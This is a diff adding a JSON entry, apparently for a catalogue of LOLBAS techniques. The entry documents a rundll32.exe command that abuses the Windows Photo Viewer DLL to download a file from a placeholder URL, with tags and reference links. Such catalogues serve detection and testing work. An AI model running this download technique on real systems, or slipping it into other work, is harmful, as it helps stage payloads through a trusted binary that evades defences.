@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-photoviewer-dll-download",
+  "name": "LOLBAS · PhotoViewer.dll (Download)",
+  "command": "rundll32.exe \"C:\\Program Files\\Windows Photo Viewer\\PhotoViewer.dll\",ImageView_Fullscreen {REMOTEURL}",
+  "description": "Once executed, rundll32.exe will download the file at the specified URL to the user's INetCache folder using the Windows Photo Viewer DLL.",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "photoviewer.dll",
+    "download"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/PhotoViewer.dll/",
+  "upstream_id": "PhotoViewer.dll/Download/0",
+  "category": "lolbas",
+  "subcategory": "download",
+  "references": [
+    {
+      "title": "LOLBAS — PhotoViewer.dll",
+      "url": "https://lolbas-project.github.io/lolbas/PhotoViewer.dll/"
+    }
+  ]
+}
